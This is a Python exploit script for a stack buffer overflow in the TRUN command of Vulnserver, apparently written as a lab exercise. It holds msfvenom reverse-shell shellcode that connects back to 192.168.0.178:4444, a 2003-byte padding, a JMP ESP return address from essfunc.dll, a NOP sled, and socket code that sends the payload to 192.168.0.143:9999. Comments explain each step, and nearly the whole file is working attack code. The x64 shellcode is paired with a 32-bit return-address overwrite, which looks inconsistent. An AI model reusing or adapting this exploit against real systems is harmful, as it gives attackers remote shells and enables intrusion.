#!/usr/bin/python
import sys, socket

# in ID we used mona.py to find a vulnerable module by entering !mona modules and looked for a module without protections
# In this case the module with lot of falses when it came to protections was essfucnc.dll
# we then used nasm in kali to find the hex code for JMP ESP FFE4, which when written in hex looks like \xFF\xE4
# we then used mona.py in ID to run the following !mona find -s "\xff\xe4" -m essfunc.dll
# -m = module which is the module found in line 4 that was attached to vulnserver that had no protections = essfunc.dll
# -s "\xff\xe4" is the adress FFE4 written as hex code (FFE4 generated by nasm for the JMP ESP)
# When you run line 6 it provides a list of return addresses, start at the top of that list
# After our As we are going to enter the addresses returned in the previous line in reverse in hex format e.g. 625011af = \xaf\x11\x50\x62


# This overflow was generated using msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.178 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
# Apparently EXITFUNC=thread makes it more s_string_variable
# -f = file type in this case C
# -a = architecture in this case x86
# -b = bad characters not to be used in the overflow code = in this case"\x00" is the null byte

# Overflow also generated using msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.178 LPORT=4444 EXITFUNC=thread -f c -a x64 -b "\x00"
# The current overflow is x64

overflow = ("\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
"\xff\xff\x48\xbb\xd1\xf7\x67\xc1\x23\x4f\x7d\x38\x48\x31\x58"
"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x2d\xbf\xe4\x25\xd3\xa7"
"\xbd\x38\xd1\xf7\x26\x90\x62\x1f\x2f\x69\x87\xbf\x56\x13\x46"
"\x07\xf6\x6a\xb1\xbf\xec\x93\x3b\x07\xf6\x6a\xf1\xbf\xec\xb3"
"\x73\x07\x72\x8f\x9b\xbd\x2a\xf0\xea\x07\x4c\xf8\x7d\xcb\x06"
"\xbd\x21\x63\x5d\x79\x10\x3e\x6a\x80\x22\x8e\x9f\xd5\x83\xb6"
"\x36\x89\xa8\x1d\x5d\xb3\x93\xcb\x2f\xc0\xf3\xc4\xfd\xb0\xd1"
"\xf7\x67\x89\xa6\x8f\x09\x5f\x99\xf6\xb7\x91\xa8\x07\x65\x7c"
"\x5a\xb7\x47\x88\x22\x9f\x9e\x6e\x99\x08\xae\x80\xa8\x7b\xf5"
"\x70\xd0\x21\x2a\xf0\xea\x07\x4c\xf8\x7d\xb6\xa6\x08\x2e\x0e"
"\x7c\xf9\xe9\x17\x12\x30\x6f\x4c\x31\x1c\xd9\xb2\x5e\x10\x56"
"\x97\x25\x7c\x5a\xb7\x43\x88\x22\x9f\x1b\x79\x5a\xfb\x2f\x85"
"\xa8\x0f\x61\x71\xd0\x27\x26\x4a\x27\xc7\x35\x39\x01\xb6\x3f"
"\x80\x7b\x11\x24\x62\x90\xaf\x26\x98\x62\x15\x35\xbb\x3d\xd7"
"\x26\x93\xdc\xaf\x25\x79\x88\xad\x2f\x4a\x31\xa6\x2a\xc7\x2e"
"\x08\x3a\x88\x9d\x38\x0e\x0a\x8e\xc4\x55\xc1\x23\x0e\x2b\x71"
"\x58\x11\x2f\x40\xcf\xef\x7c\x38\xd1\xbe\xee\x24\x6a\xf3\x7f"
"\x38\xc0\xab\xa7\x69\x23\xfd\x3c\x6c\x98\x7e\x83\x8d\xaa\xbe"
"\x3c\x82\x9d\x80\x41\xc6\xdc\x9a\x31\xb1\x3b\x9f\x66\xc0\x23"
"\x4f\x24\x79\x6b\xde\xe7\xaa\x23\xb0\xa8\x68\x81\xba\x56\x08"
"\x6e\x7e\xbd\x70\x2e\x37\x2f\x48\xe1\x07\x82\xf8\x99\x7e\xa6"
"\x80\x99\xa5\x72\xe7\x31\x08\xb2\x89\xaa\x88\x17\x28\x90\xaf"
"\x2b\x48\xc1\x07\xf4\xc1\x90\x4d\xfe\x64\x57\x2e\x82\xed\x99"
"\x76\xa3\x81\x21\x4f\x7d\x71\x69\x94\x0a\xa5\x23\x4f\x7d\x38"
"\xd1\xb6\x37\x80\x73\x07\xf4\xda\x86\xa0\x30\x8c\x12\x8f\x17"
"\x35\x88\xb6\x37\x23\xdf\x29\xba\x7c\xf5\xa3\x66\xc0\x6b\xc2"
"\x39\x1c\xc9\x31\x67\xa9\x6b\xc6\x9b\x6e\x81\xb6\x37\x80\x73"
"\x0e\x2d\x71\x2e\x37\x26\x91\x6a\xb0\xb5\x75\x58\x36\x2b\x48"
"\xe2\x0e\xc7\x41\x1d\xc8\xe1\x3e\xf6\x07\x4c\xea\x99\x08\xad"
"\x4a\x2d\x0e\xc7\x30\x56\xea\x07\x3e\xf6\xf4\x9d\x25\xfb\xfd"
"\x26\x7b\x85\xda\xc0\xa5\x2e\x22\x2f\x42\xe7\x67\x41\x3e\xad"
"\xfd\xe7\x3a\xc3\x3a\x78\x83\x96\xe4\x15\xae\x49\x4f\x24\x79"
"\x58\x2d\x98\x14\x23\x4f\x7d\x38")

# In the following we are filling the memory available with As, hitting the EIP represented by the address "\xaf\x11\x50\x62"
# We are then adding a little bit of padding using nop sleds which is essentially a little bit of padding before the exploit code actually runs.


shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow


try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('192.168.0.143',9999))
    s.send(('TRUN /.:/' + shellcode))
    s.close

except:
    print "Error connecting to server"
    sys.exit()
